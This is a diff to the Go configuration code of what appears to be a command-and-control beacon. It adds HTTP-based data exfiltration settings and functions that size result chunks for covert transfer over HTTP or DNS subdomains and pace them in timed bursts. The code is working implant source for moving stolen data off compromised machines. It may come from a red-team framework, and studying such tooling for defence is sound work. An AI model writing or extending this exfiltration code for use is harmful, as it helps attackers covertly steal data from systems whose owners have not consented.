@@ -58,6 +58,14 @@ type Config struct {
 	// update_transport task, the same way Shadow Mesh domains are updated.
 	Transport     string
 	HTTPListeners []HTTPListener // Endpoints to use, in preference order
+
+	// HTTPExfil is the HTTP counterpart of the DataExfil phase: it decides how
+	// much result data one request carries. DNS sizes chunks from label budgets;
+	// HTTP can carry the listener's whole body allowance, so the operator sets it.
+	//
+	// Zero values keep the DNS-derived sizing, so a build that does not mention
+	// these fields behaves exactly as before.
+	HTTPExfil HTTPExfilConfig
 	// HTTPFallbackAfterFailures is how many consecutive HTTP failures make the
 	// beacon fall back to DNS in dual mode. Zero means the default.
 	HTTPFallbackAfterFailures int
@@ -174,6 +182,136 @@ func (c *Config) GetPollPhase() PollPhaseConfig {
 		p.ARecordTaskIP = "127.0.0.2"
 	}
 	return p
+}
+
+// HTTPExfilConfig controls result chunking on the HTTP transport.
+type HTTPExfilConfig struct {
+	// MaxPayload is the raw byte budget for one DATA chunk. Zero means "use the
+	// DNS-derived size", which is what every pre-existing build gets.
+	MaxPayload int `json:"max_payload"`
+	// MaxBodyBytes is the listener profile's request-body ceiling. It clamps
+	// MaxPayload so a chunk cannot be built that the listener will reject.
+	MaxBodyBytes int `json:"max_body_bytes"`
+	// ChunksPerBurst and BurstPauseMs override the DNS pacing when non-zero: a
+	// 64 KiB chunk does not want the same rhythm as an 80 byte one.
+	ChunksPerBurst int `json:"chunks_per_burst"`
+	BurstPauseMs   int `json:"burst_pause_ms"`
+}
+
+// httpChunkCeiling converts the listener's body allowance into a raw payload
+// budget. base36 expands 5 bytes into 8 characters, so a body of N bytes leaves
+// room for N*5/8 raw bytes; the protocol envelope and headers are subtracted
+// separately by the caller.
+func httpChunkCeiling(maxBodyBytes int) int {
+	if maxBodyBytes <= 0 {
+		return 0
+	}
+	return maxBodyBytes * 5 / 8
+}
+
+// ResultChunkSize returns how many raw bytes go into one DATA chunk.
+//
+// On HTTP the operator's HTTPExfil.MaxPayload wins, clamped to what the listener
+// will accept. On DNS (or when HTTP chunking is not configured) the size is
+// derived from the subdomain and FQDN budgets exactly as it always was.
+func (c *Config) ResultChunkSize() int {
+	if c.Transport == "http" && c.HTTPExfil.MaxPayload > 0 {
+		size := c.HTTPExfil.MaxPayload
+		if ceiling := httpChunkCeiling(c.HTTPExfil.MaxBodyBytes); ceiling > 0 && size > ceiling {
+			size = ceiling
+		}
+		if size < 1 {
+			size = 1
+		}
+		return size
+	}
+
+	exfilPhase := c.GetDataExfilPhase()
+
+	maxCmd := exfilPhase.MaxPayload
+	if maxCmd <= 0 {
+		maxCmd = c.MaxCommandLength
+	}
+	if maxCmd <= 64 {
+		maxCmd = 800
+	}
+
+	maxSubLen := exfilPhase.MaxPayload
+	if maxSubLen <= 0 {
+		maxSubLen = c.MaxSubdomainLength
+	}
+
+	overhead := 63
+	if !exfilPhase.Encrypted {
+		overhead = 35
+	}
+
+	var safeRawChunk int
+	if maxSubLen > 0 {
+		labelDots := maxSubLen / 63
+		encodedBudget := maxSubLen - labelDots
+		safeRawChunk = encodedBudget*5/8 - overhead
+		if safeRawChunk < 1 {
+			safeRawChunk = 1
+		}
+	} else {
+		safeRawChunk = (maxCmd - 100) / 2
+		if safeRawChunk < 8 {
+			safeRawChunk = 8
+		}
+	}
+
+	if exfilPhase.PayloadFormat != "" {
+		xSlots := countDataSlots(exfilPhase.PayloadFormat)
+		formatChunk := xSlots*5/8 - overhead
+		if formatChunk >= 1 {
+			if safeRawChunk == 0 || formatChunk < safeRawChunk {
+				safeRawChunk = formatChunk
+			}
+		}
+	}
+
+	maxDomainLen := 0
+	for _, d := range c.GetDomains() {
+		if len(d) > maxDomainLen {
+			maxDomainLen = len(d)
+		}
+	}
+	if maxDomainLen == 0 {
+		maxDomainLen = 20
+	}
+	subBudget := 253 - 1 - maxDomainLen
+	fqdnLabelDots := subBudget / 63
+	fqdnEncoded := subBudget - fqdnLabelDots
+	fqdnCap := fqdnEncoded*5/8 - overhead
+	if fqdnCap < 8 {
+		fqdnCap = 8
+	}
+	if safeRawChunk > fqdnCap {
+		safeRawChunk = fqdnCap
+	}
+	return safeRawChunk
+}
+
+// ResultBurst returns the chunk pacing for results, preferring the HTTP-specific
+// values when the beacon is on HTTP and the operator set them.
+func (c *Config) ResultBurst() (chunksPerBurst, pauseMs int) {
+	chunksPerBurst, pauseMs = c.ExfilChunksPerBurst, c.ExfilBurstPauseMs
+	if c.Transport == "http" {
+		if c.HTTPExfil.ChunksPerBurst > 0 {
+			chunksPerBurst = c.HTTPExfil.ChunksPerBurst
+		}
+		if c.HTTPExfil.BurstPauseMs > 0 {
+			pauseMs = c.HTTPExfil.BurstPauseMs
+		}
+	}
+	if chunksPerBurst <= 0 {
+		chunksPerBurst = 10
+	}
+	if pauseMs <= 0 {
+		pauseMs = 5000
+	}
+	return chunksPerBurst, pauseMs
 }
 
 // GetDataExfilPhase returns the resolved data exfil phase config
